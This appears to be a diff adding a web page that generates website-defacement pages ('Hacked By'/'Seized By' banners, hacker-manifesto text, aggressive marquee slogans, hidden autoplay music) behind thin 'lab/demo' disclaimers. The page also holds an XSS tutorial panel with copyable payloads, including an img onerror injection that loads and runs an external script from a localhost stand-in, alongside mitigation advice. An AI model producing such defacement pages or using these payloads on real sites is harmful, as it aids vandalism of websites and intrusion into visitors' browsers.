@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Advanced Defacement Page Generator</title>
+<meta name="description" content="Create retro 'hacker' themed page templates for lab & demo use. Export HTML, preview and customize fonts, gradients, marquee, animations. For educational use only.">
+<meta name="keywords" content="defacement templates, deface templates, deface code generator, page generator, Animated Deface Templates, hacker-style templates, security lab templates, demo generator">
+ <!-- Canonical: change to your real published URL (use lowercase/consistent path) -->
+ <link rel="canonical" href="https://zahidservers.github.io/defacement-code-generator/">
+
+ <!-- Open Graph (social previews) -->
+ <meta property="og:type" content="website">
+ <meta property="og:title" content="Defacement Templates Demo — Visual Page Generator for Security Labs">
+ <meta property="og:description" content="Create Customized retro Animated 'hacker' themed page templates for lab & demo use. Live preview, Google fonts, gradients, marquee, images/gif, music, animated text and exportable HTML. Educational/demo only.">
+ <meta property="og:url" content="https://zahidservers.github.io/defacement-code-generator/">
+ <meta property="og:image" content="https://zahidservers.github.io/defacement-code-generator/assets/preview-opengraph.png">
+ <meta property="og:site_name" content="Defacement Templates Demo">
+
+ <!-- Twitter card -->
+ <meta name="twitter:card" content="summary_large_image">
+ <meta name="twitter:title" content="Defacement Templates Demo — Visual Page Generator for Security Labs">
+ <meta name="twitter:description" content="Create Customized retro Animated 'hacker' themed page templates for lab & demo use. For educational/demo use only.">
+ <meta name="twitter:image" content="https://zahidservers.github.io/defacement-code-generator/assets/preview-opengraph.png">
+
+ <!-- Schema.org / JSON-LD -->
+ <script type="application/ld+json">
+ {
+   "@context": "https://schema.org",
+   "@type": "SoftwareApplication",
+   "name": "Defacement Templates Demo",
+   "description": "Visual page generator for retro defacement-style templates (educational demo).",
+   "url": "https://zahidservers.github.io/defacement-code-generator/",
+   "applicationCategory": "DeveloperTool",
+   "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" }
+ }
+ </script>
+ <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+ <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&family=Pacifico&family=Courier+Prime&family=Nosifer&display=swap">
+ <link rel="icon" href="https://webaon.com/wp-content/uploads/2022/05/cropped-WhatsApp-Image-2021-12-02-at-10.25.23-AM-32x32.jpeg" sizes="32x32" />
+<link rel="icon" href="https://webaon.com/wp-content/uploads/2022/05/cropped-WhatsApp-Image-2021-12-02-at-10.25.23-AM-192x192.jpeg" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://webaon.com/wp-content/uploads/2022/05/cropped-WhatsApp-Image-2021-12-02-at-10.25.23-AM-180x180.jpeg" />
+<meta name="msapplication-TileImage" content="https://webaon.com/wp-content/uploads/2022/05/cropped-WhatsApp-Image-2021-12-02-at-10.25.23-AM-270x270.jpeg" />
+ <meta name="theme-color" content="#111827">
+ <meta name="robots" content="index,follow">
+
+<style>
+body { font-family: Arial; background: #111; color: #eee; padding: 20px; }
+input, textarea, select, button { width: 98%; margin-bottom: 10px; padding: 10px; border-radius: 5px; }
+input[type="color"]{padding: 1px;}
+button { cursor: pointer; background-color: rgb(22, 246, 224); color: black; font-weight: bolder; }
+button:hover{background-color: rgb(22, 44, 246); color: aliceblue;}
+#preview { border: 1px solid #444; padding: 10px; height: 400px; width: 100%; }
+.container { display: flex; gap: 20px;}
+.left-column {flex: 1; max-width: 400px;}
+.right-column {flex: 2; display: flex; flex-direction: column; gap: 10px;}
+button {cursor: pointer;}
+#preview {border: 1px solid #444;height: 600px;width: 100%;}
+#output {width: 100%;height: 400px;}
+</style>   
+</head>
+<body>
+<h1>Advanced Defacement Page Generator</h1>
+<div class="container">
+<div class="left-column">
+<label>Nick:</label><br>
+<input type="text" id="nick" placeholder="Enter your nickname" value="Unkown White Pointy Hat Hacker"><br>
+
+<label>Team:</label><br>
+<input type="text" id="team" placeholder="Enter your team" value="Anonymous Team"><br>
+
+<label>Message:</label><br>
+<textarea id="message" placeholder="Enter a message">This is a secret message</textarea><br>
+
+<label>Background Type:</label><br>
+<select id="bgType"><br>
+  <option value="solid">Solid Color</option>
+  <option value="gradient">Gradient</option>
+</select>
+<label>Background Color 1:</label>
+<input type="color" id="bg1" value="#222222">
+<label>Background Color 2 (for gradient):</label>
+<input type="color" id="bg2" value="#444444">
+
+<label>Font:</label><br>
+<select id="font">
+  <option value="'Roboto', sans-serif">Roboto</option>
+  <option value="'Pacifico', cursive">Pacifico</option>
+  <option value="'Courier Prime', monospace">Courier Prime</option>
+  <option value="'Nosifer', cursive">Nosifer</option>
+</select><br>
+
+<label>Text Type:</label><br>
+<select id="textType">
+  <option value="solid">Solid</option>
+  <option value="gradient">Gradient</option>
+</select><br>
+<label>Text Color 1:</label><br>
+<input type="color" id="text1" value="#ffffff"><br>
+<label>Text Color 2 (for gradient):</label><br>
+<input type="color" id="text2" value="#ff0000"><br>
+
+<label>Text Shadow Color:</label><br>
+<input type="color" id="shadowColor" value="#ff0000"><br>
+
+<label>Image/GIF:</label><br>
+<select id="imageOption">
+  <option value="https://onlypult.com/blog_uploads/1510825664-3f46e7d3d2bc2db8bc838e32f7a6211d.png">Default PNG</option>
+  <option value="https://cdn.prinsh.com/data-1/images/NathanPrinsley-haxor-icon.svg">Default Icon</option>
+  <option value="custom">Custom URL</option>
+</select><br>
+<input type="text" id="imageUrl" placeholder="Custom image URL" value=""><br>
+
+<label>Music URL:</label><br>
+<input type="text" id="musicUrl" placeholder="Music URL" value="https://www.youtube.com/embed/LApS9G22cIU"><br>
+
+<label>Marquee Text:</label><br>
+<input type="text" id="marqueeText" placeholder="Enter marquee text" value="STRIKE FIRST  |  F HARD  |  NO MERCY"><br>
+<label>Marquee Background Type:</label><br>
+<select id="marqueeBgType">
+  <option value="solid">Solid</option>
+  <option value="gradient">Gradient</option>
+</select><br>
+<label>Marquee Color 1:</label><br>
+<input type="color" id="marquee1" value="#008000"><br>
+<label>Marquee Color 2 (for gradient):</label><br>
+<input type="color" id="marquee2" value="#00ff00"><br>
+<label>Marquee Text Type:</label><br>
+<select id="marqueeTextType">
+  <option value="solid">Solid</option>
+  <option value="gradient">Gradient</option>
+</select><br>
+<label>Marquee Text Color 1:</label><br>
+<input type="color" id="marqueeText1" value="#ffffff"><br>
+<label>Marquee Text Color 2 (for gradient):</label><br>
+<input type="color" id="marqueeText2" value="#ff0000"><br>
+<label>Phrases (one per line):</label><br>
+<textarea id="phrases" rows="6" placeholder="Enter phrases (one per line)">
+Yes, We are criminal.
+Our crime is our curiosity.
+Our crime is that of judging people by what they say and think, not what they look like.
+Our crime is that of outsmarting you, something that you will never forgive us for.
+We are hackers, and this is our manifesto.
+You may stop this individual, but you cant stop us all...
+after all, were all alike.
+</textarea><br>
+<textarea id="chars" rows="12" placeholder="Enter chars (one per line)">
+Lazy Hackers
+Seized
+127.0.0.1
+1337
+0x523344
+Localhost
+Sh4d0w Pr0x
+HACKED!
+Security
+Breached!
+System
+Danger
+</textarea><br>
+<button onclick="generate()">Generate HTML/Preview</button>
+</div>
+<div class="right-column">
+<h2>Preview: <button style="width: 400px;" onclick="generate()">Generate HTML/Preview</button></h2>
+<iframe id="preview"></iframe>
+
+<h2>Generated Code:</h2>
+<textarea id="output" rows="20" style="width:100%;"></textarea>
+<button id="copyBtn" onclick="copyCode()">📋 Copy Code</button>
+<!-- BEGIN: XSS Quick-Learn & PoC (lab-only) -->
+<style>
+    .xss-help { background:#0f1720; color:#e6eef6; border:1px solid #263145; padding:12px; border-radius:8px; margin-top:12px; font-family:system-ui,Segoe UI,Roboto,Arial; }
+    .xss-help h3 { margin:0 0 8px 0; font-size:16px; }
+    .xss-help summary { cursor:pointer; font-weight:600; }
+    .xss-help pre { background:#071022; color:#9fe3ff; padding:8px; border-radius:6px; overflow:auto; }
+    .xss-help code { color:#cde; }
+    .xss-help .muted { color:#9fb0c6; font-size:13px; }
+    .xss-btn { background:#16f6e0; color:#022; border:none; padding:6px 10px; border-radius:6px; cursor:pointer; font-weight:700; }
+    .xss-btn:active { transform:translateY(1px); }
+    .xss-row { display:flex; gap:8px; align-items:center; margin-top:8px; flex-wrap:wrap; }
+    .xss-small { font-size:12px; padding:6px 8px; border-radius:6px; background:#152232; color:#dff; border:1px solid #22364a; }
+  </style>
+  
+  <div class="xss-help">
+    <details open>
+      <summary><h3>XSS Quick-Learn & PoC (for local labs only)</h3></summary>
+  
+      <p class="muted"><strong>Warning:</strong> Only test these examples on systems you own or are explicitly authorized to test (e.g. <code>localhost</code> or purpose-built labs). Misuse against third-party systems is illegal.</p>
+  
+      <h4>1 — What XSS is (short)</h4>
+      <p class="muted">Cross-Site Scripting (XSS) happens when attacker-controlled input is included in a page and the browser executes it as code. The injected script runs in the victim’s browser with the site’s privileges and can read DOM, make authenticated requests, or exfiltrate local data.</p>
+  
+      <hr style="border:none;border-top:1px solid #22364a;margin:10px 0;">
+  
+      <h4>2 — How to confirm (safe PoCs)</h4>
+  
+      <p class="muted"><strong>Reflected / basic (body context)</strong><br>
+      Put the URL-encoded payload into a parameter on a local app that reflects input. This is a safe, non-destructive test that only shows execution.</p>
+  
+      <pre><code>%3Cscript%3Ealert('XSS')%3C%2Fscript%3E</code></pre>
+  
+      <div class="xss-row">
+        <button class="xss-btn" onclick="navigator.clipboard.writeText('%3Cscript%3Ealert(\\'XSS\\')%3C%2Fscript%3E').then(()=>this.innerText='Copied!')">Copy encoded &lt;script&gt; PoC</button>
+        <span class="xss-small">Use only on <code>localhost</code></span>
+      </div>
+  
+      <p style="margin-top:12px" class="muted"><strong>Event-handler (when &lt;script&gt; is blocked but tags allowed)</strong><br>
+      Use an element event like <code>onerror</code> to dynamically load a harmless external file from a local server (lab only).</p>
+  
+      <pre><code>&lt;img src="x" onerror="var s=document.createElement('script');s.src='http://localhost:9000/malicious.js';document.body.appendChild(s);"&gt;</code></pre>
+  
+      <pre><code>%3Cimg%20src%3Dx%20onerror%3D%22var%20s%3Ddocument.createElement('script')%3Bs.src%3D'http%3A%2F%2Flocalhost%3A9000%2Fmalicious.js'%3Bdocument.body.appendChild(s)%3B%22%3E</code></pre>
+  
+      <div class="xss-row">
+        <button class="xss-btn" onclick="navigator.clipboard.writeText('%3Cimg%20src%3Dx%20onerror%3D%22var%20s%3Ddocument.createElement(\\'script\\')%3Bs.src%3D\\'http%3A%2F%2Flocalhost%3A9000%2Fmalicious.js\\'%3Bdocument.body.appendChild(s)%3B%22%3E').then(()=>this.innerText='Copied!')">Copy encoded &lt;img onerror&gt; PoC</button>
+        <button class="xss-btn" onclick="navigator.clipboard.writeText('<img src=&quot;x&quot; onerror=&quot;var s=document.createElement(\\'script\\');s.src=\\'http://localhost:9000/malicious.js\\';document.body.appendChild(s);&quot;>')">Copy raw &lt;img onerror&gt;</button>
+        <span class="xss-small">Start a local server with <code>python3 -m http.server 9000</code> and serve a harmless <code>malicious.js</code> (see below)</span>
+      </div>
+  
+      <p class="muted" style="margin-top:12px"><strong>`malicious.js` (harmless lab file)</strong></p>
+      <pre><code>// malicious.js (lab only)
+  console.log('Lab external script executed — no harm done');
+  alert('External script executed (lab)');
+  </code></pre>
+  
+      <hr style="border:none;border-top:1px solid #22364a;margin:10px 0;">
+  
+      <h4>3 — How to inspect & confirm</h4>
+      <ol class="muted">
+        <li>Open DevTools → <strong>Network</strong>, reload the page, inspect response body where your input is reflected.</li>
+        <li>Open DevTools → <strong>Elements</strong>, find where your input is inserted (text node, attribute, inside &lt;script&gt; etc.).</li>
+        <li>Check Console for your <code>alert()</code> or <code>console.log()</code> messages.</li>
+      </ol>
+  
+      <h4>4 — Why this matters</h4>
+      <p class="muted">With XSS an attacker can impersonate users, make authenticated API calls, capture credentials via phishing UI, or exfiltrate sensitive page content.</p>
+  
+      <h4>5 — Fixes & mitigations</h4>
+      <p class="muted">
+        <strong>Output-encode</strong> user input by context (HTML, attribute, JS).<br>
+        Example (PHP): <code>htmlspecialchars($v, ENT_QUOTES|ENT_HTML5, 'UTF-8')</code> or <code>json_encode()</code> inside scripts.<br>
+        Use CSP, HttpOnly cookies, avoid <code>innerHTML</code> with untrusted data, and sanitize HTML with libraries like DOMPurify if you must allow markup.
+      </p>
+  
+      <h4>6 — What to include in a bug report</h4>
+      <ul class="muted">
+        <li>Exact PoC URL (encoded) you used.</li>
+        <li>Browser + version.</li>
+        <li>Screenshot: Elements showing reflection and Network showing response.</li>
+        <li>Short impact statement and recommended fix (contextual encoding + CSP + HttpOnly).</li>
+      </ul>
+  
+      <h4>7 — Quick checklist (safe testing)</h4>
+      <ul class="muted">
+        <li>Test only on <code>localhost</code> or systems you own.</li>
+        <li>Use non-destructive PoCs: <code>alert()</code> or <code>console.log()</code>.</li>
+        <li>Don’t share active payloads publicly against third-party sites.</li>
+      </ul>
+  
+      <div style="margin-top:8px;">
+        <button class="xss-btn" onclick="copyAllPoCs()">Copy all encoded PoCs</button>
+        <span class="xss-small" id="copyStatus"></span>
+      </div>
+  
+    </details>
+  </div>
+  
+  <script>
+    // copyAllPoCs: copies both encoded payloads in a single clipboard string for convenience
+    function copyAllPoCs() {
+      const encodedScript = "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E";
+      const encodedImg = "%3Cimg%20src%3Dx%20onerror%3D%22var%20s%3Ddocument.createElement('script')%3Bs.src%3D'http%3A%2F%2Flocalhost%3A9000%2Fmalicious.js'%3Bdocument.body.appendChild(s)%3B%22%3E";
+      const text = "Encoded <script> PoC (lab):\\n" + encodedScript + "\\n\\nEncoded <img onerror> PoC (lab):\\n" + encodedImg;
+      navigator.clipboard.writeText(text).then(() => {
+        const status = document.getElementById('copyStatus');
+        status.innerText = "✅ Copied PoCs to clipboard (lab only)";
+        setTimeout(() => status.innerText = "", 3000);
+      }).catch(err => {
+        alert('Copy failed: ' + err);
+      });
+    }
+  </script>
+  <!-- END: XSS Quick-Learn & PoC (lab-only) -->
+  
+</div>
+</div>
+<script>
+function copyCode() {
+  const output = document.getElementById('output');
+  output.select();
+  output.setSelectionRange(0, 99999); // for mobile devices
+  navigator.clipboard.writeText(output.value).then(() => {
+    const btn = document.getElementById('copyBtn');
+    btn.textContent = "✅ Copied!";
+    setTimeout(() => btn.textContent = "📋 Copy Code", 2000);
+  }).catch(err => {
+    alert("Copy failed: " + err);
+  });
+}
+// Function to generate HTML
+function generate() {
+  const nick = document.getElementById('nick').value;
+  const team = document.getElementById('team').value;
+  const message = document.getElementById('message').value;
+  const bgType = document.getElementById('bgType').value;
+  const bg1 = document.getElementById('bg1').value;
+  const bg2 = document.getElementById('bg2').value;
+  const font = document.getElementById('font').value;
+  const textType = document.getElementById('textType').value;
+  const text1 = document.getElementById('text1').value;
+  const text2 = document.getElementById('text2').value;
+  const shadowColor = document.getElementById('shadowColor').value;
+  const imageOption = document.getElementById('imageOption').value;
+  const imageUrl = imageOption === "custom" ? document.getElementById('imageUrl').value : imageOption;
+  const musicUrl = document.getElementById('musicUrl').value;
+  
+  // Marquee
+  const marqueeText = document.getElementById('marqueeText').value;
+  const marqueeBgType = document.getElementById('marqueeBgType').value;
+  const marquee1 = document.getElementById('marquee1').value;
+  const marquee2 = document.getElementById('marquee2').value;
+  const marqueeTextType = document.getElementById('marqueeTextType').value;
+  const marqueeText1 = document.getElementById('marqueeText1').value;
+  const marqueeText2 = document.getElementById('marqueeText2').value;
+
+  // Background CSS
+  const background = bgType === 'solid' ? bg1 : `linear-gradient(135deg, ${bg1}, ${bg2})`;
+
+  // Text CSS
+  const textStyle = textType === 'solid'
+    ? `color: ${text1}; text-shadow: 0 0 0.5em ${shadowColor};`
+    : `background: linear-gradient(45deg, ${text1}, ${text2}); -webkit-background-clip: text; color: transparent; text-shadow: 0 0 0.5em ${shadowColor};`;
+
+  // Pharases
+  const phrasesArr = document.getElementById('phrases').value
+    .split(/\r?\n/)
+    .map(s => s.trim())
+    .filter(Boolean);
+
+  // build the JS snippet safely
+  const phrasesSnippet = 'const phrases = ' + JSON.stringify(phrasesArr) + ';';  
+
+  // Get chars from textarea
+  const charsInput = document.getElementById('chars').value.trim();
+  const charsArray = charsInput.split('\n').map(line => line.trim()).filter(line => line !== '');
+  const charsJs = `['${charsArray.join("','")}']`;
+
+  // Marquee CSS
+  const marqueeBg = marqueeBgType === 'solid' ? marquee1 : `linear-gradient(90deg, ${marquee1}, ${marquee2})`;
+  const marqueeTextCss = marqueeTextType === 'solid'
+    ? `color: ${marqueeText1};`
+    : `background: linear-gradient(45deg, ${marqueeText1}, ${marqueeText2}); -webkit-background-clip: text; color: transparent;`;
+
+  const html = `
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Hacked By ${nick}</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&family=Pacifico&family=Courier+Prime&family=Nosifer&display=swap">
+<style>body{background: ${background}; font-family: ${font}; text-align: center; padding-top: 10px; color: #fff; } h1{font-size: 48px; margin-top: 20px; ${textStyle} } h2{font-size: 32px; ${textStyle} } p{font-size: 20px; ${textStyle} } img{max-width: 30%; margin-top: 20px;}
+marquee { font-size: 24px; padding: 5px; background: ${marqueeBg}; ${marqueeTextCss} }
+.text{font-weight: 100;font-size: 28px;color: #FAFAFA; font-family: Iceland; text-shadow: 0 0 0.5em cyan, 0 0 0.5em cyan;}
+.dud{color:#757575}.animation-container{position:fixed;top:20px;left:0;right:0;bottom:30px;z-index:1}.animation-container span{color:rgba(139, 251, 141, 0.657);display:block;font-size:18px;font-family:'Helvetica';text-shadow:0 0 1px #fff;position:absolute;user-select:none;pointer-events:none;cursor:default;z-index:1;opacity:0;will-change:transform,opacity;animation-timing-function:ease-out;animation-name:move}@keyframes move{0%{opacity:0;transform:translateY(100vh)}25%{opacity:1}50%{opacity:1}75%{opacity:0}100%{opacity:0;transform:none}}.buzz_wrapper{position:relative;width:100%;margin:180px auto;background-attachment:fixed;background-image:url(http://i.imgur.com/9QpJPlG.jpg);background-position:0 0;background-repeat:no-repeat;background-size:cover;overflow:hidden;overflow:hidden;padding:100px}.scanline{width:100%;display:block;background:#000;height:4px;position:relative;z-index:3;margin-bottom:5px;opacity:.1}.buzz_wrapper span{position:absolute;-webkit-filter:blur(1px);font-size:30px;font-family:'Courier new',fixed;font-weight:700}.buzz_wrapper span:nth-child(1){color:red;margin-left:-2px;-webkit-filter:blur(2px)}.buzz_wrapper span:nth-child(2){color:green;margin-left:2px;-webkit-filter:blur(2px)}.buzz_wrapper span:nth-child(3){color:blue;position:20px 0;-webkit-filter:blur(1px)}.buzz_wrapper span:nth-child(4){color:#fff;-webkit-filter:blur(1px);text-shadow:0 0 50px rgb(255 255 255 / .4)}.buzz_wrapper span:nth-child(5){color:rgb(255 255 255 / .4);-webkit-filter:blur(15px)}.buzz_wrapper span{-webkit-animation:blur 30ms infinite,jerk 50ms infinite}@-webkit-keyframes blur{0%{-webkit-filter:blur(1px);opacity:.8}50%{-webkit-filter:blur(1px);opacity:1}100%{-webkit-filter:blur(1px);opacity:.8}}@-webkit-keyframes jerk{50%{left:1px}51%{left:0}}@-webkit-keyframes jerkup{50%{top:1px}51%{top:0}}.buzz_wrapper span:nth-child(3){-webkit-animation:jerkblue 1s infinite}@-webkit-keyframes jerkblue{0%{left:0}30%{left:0}31%{left:10px}32%{left:0}98%{left:0}100%{left:10px}}.buzz_wrapper span:nth-child(2){-webkit-animation:jerkgreen 1s infinite}@-webkit-keyframes jerkgreen{0%{left:0}30%{left:0}31%{left:-10px}32%{left:0}98%{left:0}100%{left:-10px}}.buzz_wrapper .text{-webkit-animation:jerkwhole 5s infinite;position:relative}@-webkit-keyframes jerkwhole{30%{}40%{opacity:1;top:0;left:0;-webkit-transform:scale(1,1);-webkit-transform:skew(0,0)}41%{opacity:.8;top:0;left:-100px;-webkit-transform:scale(1,1.2);-webkit-transform:skew(50deg,0)}42%{opacity:.8;top:0;left:100px;-webkit-transform:scale(1,1.2);-webkit-transform:skew(-80deg,0)}43%{opacity:1;top:0;left:0;-webkit-transform:scale(1,1);-webkit-transform:skew(0,0)}}
+</style>
+</head>
+<body>
+<marquee bgcolor="${marqueeBg}" direction="scroll" behavior="scroll">${marqueeText}</marquee>
+<h1 class="h1-text">Seized By ${nick}</h1>
+<h2>${team}</h2>
+<img src="${imageUrl}" style="height:170px;" alt="Image/GIF">
+<p>${message}</p>
+${musicUrl ? `<iframe width="0" height="0" src="${musicUrl}" title="YouTube video player" referrerpolicy='strict-origin-when-cross-origin' frameborder="0" rel="noreferrer" allow="autoplay; encrypted-media; web-share" allowfullscreen></iframe>` : ''}
+<script>
+    class TextScramble{constructor(el){this.el=el;this.chars='!@#$%^&*()_-=+{}:"|<>?,./;';this.update=this.update.bind(this)}
+setText(newText){const oldText=this.el.innerText;const length=Math.max(oldText.length,newText.length);const promise=new Promise((resolve)=>this.resolve=resolve);this.queue=[];for(let i=0;i<length;i++){const from=oldText[i]||'';const to=newText[i]||'';const start=Math.floor(Math.random()*40);const end=start+Math.floor(Math.random()*40);this.queue.push({from,to,start,end})}
+cancelAnimationFrame(this.frameRequest);this.frame=0;this.update();return promise}
+update(){let output='',complete=0;for(let i=0;i<this.queue.length;i++){let{from,to,start,end,char}=this.queue[i];if(this.frame>=end){complete++;output+=to}else if(this.frame>=start){if(!char||Math.random()<0.28){char=this.randomChar();this.queue[i].char=char}output+='<span class="dud">'+char+'</span>'}else{output+=from}}
+this.el.innerHTML=output;if(complete===this.queue.length)this.resolve();else{this.frameRequest=requestAnimationFrame(this.update);this.frame++}}
+randomChar(){return this.chars[Math.floor(Math.random()*this.chars.length)]}}
+${phrasesSnippet};const el=document.createElement('div');el.className='text';document.body.insertBefore(el,document.querySelector('p'));const fx=new TextScramble(el);let counter=0;const next=()=>{fx.setText(phrases[counter]).then(()=>{setTimeout(next,1500)});counter=(counter+1)%phrases.length}
+next();var app={chars:${charsJs},init:function(){app.container=document.createElement('div');app.container.className='animation-container';document.body.appendChild(app.container);window.setInterval(app.add,100)},add:function(){var element=document.createElement('span');app.container.appendChild(element);app.animate(element)},animate:function(element){var character=app.chars[Math.floor(Math.random()*app.chars.length)];var duration=Math.floor(Math.random()*15)+1;var offset=Math.floor(Math.random()*(50-duration*2))+3;var size=10+(15-duration);element.style.cssText='right:'+offset+'vw; font-size:'+size+'px;animation-duration:'+duration+'s';element.innerHTML=character;window.setTimeout(app.remove,duration*1000,element)},remove:function(element){element.parentNode.removeChild(element)},};document.addEventListener('DOMContentLoaded',app.init)
+</scr`+`ipt></bo`+`dy></ht`+`ml>`;
+
+  document.getElementById('output').value = html;
+  document.getElementById('preview').srcdoc = html;
+}
+
+// Handle image selection
+document.getElementById('imageOption').addEventListener('change', function() {
+  document.getElementById('imageUrl').style.display = this.value === 'custom' ? 'block' : 'none';
+});
+</script>
+
+</body>
+</html>
